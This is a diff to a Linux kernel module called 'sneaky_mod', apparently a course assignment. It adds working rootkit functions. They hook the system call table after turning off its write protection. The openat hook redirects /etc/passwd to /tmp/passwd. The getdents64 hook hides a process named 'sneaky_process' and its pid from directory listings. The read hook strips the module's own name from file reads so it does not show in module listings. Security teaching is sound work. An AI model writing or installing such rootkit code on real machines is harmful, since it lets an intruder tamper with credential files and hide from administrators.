@@ -44,14 +44,60 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
-  const char __user * pathname;
-  pathname = (const char __user *)regs->di;
-  if(strcmp(pathname, "/etc/passwd") == 0){
-    copy_to_user((void *)regs->di, "/tmp/passwd", strlen("/tmp/passwd"));
+  // char * pathname;
+  // pathname = (char *)regs->di;
+  // if(strcmp(pathname, "/etc/passwd") == 0){
+  //   copy_to_user((void *)pathname, "/tmp/passwd", strlen("/tmp/passwd"));
+  // }
+  // return (*original_openat)(regs);
+  if(strcmp((char*)(regs->si), "/etc/passwd") == 0){
+    const char* tmpPasswdPath = "/tmp/passwd";
+    copy_to_user((char*)(regs->si), tmpPasswdPath, strlen(tmpPasswdPath));
   }
   return (*original_openat)(regs);
 }
 
+asmlinkage int(*original_getdents64)(struct pt_regs *regs);
+
+asmlinkage int sneaky_sys_getdents64(struct pt_regs* regs){
+  int totalDirpLength = original_getdents64(regs);
+  struct linux_dirent64* dirp = (void*)(regs->si);
+
+  int curr = 0;
+  while(curr < totalDirpLength){
+    struct linux_dirent64* dirpTemp = (void*)dirp + curr;
+    if(strcmp(dirpTemp->d_name, "sneaky_process") == 0 || strcmp(dirpTemp->d_name, pid) == 0){
+      int reclen = dirpTemp->d_reclen;
+      int lenToBeCopied = ((void*)dirp + totalDirpLength) - ((void*)dirpTemp + reclen);
+      void* source = (void*)dirpTemp + reclen;
+      memmove((void*)(regs->si) + curr, source, lenToBeCopied);
+      totalDirpLength -= reclen;
+    }
+    else{
+      curr += dirpTemp->d_reclen;
+    }
+  }
+  return totalDirpLength;
+}
+
+asmlinkage ssize_t (*original_read)(struct pt_regs*);
+
+asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
+  ssize_t bytesRead = original_read(regs);
+
+  if(bytesRead > 0){
+    void* posStart = strnstr((char*)(regs->si), "sneaky_mod", bytesRead);
+    if(posStart != NULL){
+      void* posEnd = strnstr(posStart, "\n", bytesRead - (posStart - (void*)(regs->si)));
+      if(posEnd != NULL){
+        int size = posEnd - posStart + 1;
+        memmove(posStart, posEnd + 1, bytesRead - (posStart - (void*)(regs->si)) - size);
+        bytesRead -= size;
+      }
+    }
+  }
+  return bytesRead;
+}
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -66,12 +112,14 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
-  
+  original_getdents64 = (void*)sys_call_table[__NR_getdents64];
+  original_read = (void*)sys_call_table[__NR_read];
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
   
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
-
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
   // You need to replace other system calls you need to hack here
   
   // Turn write protection mode back on for sys_call_table
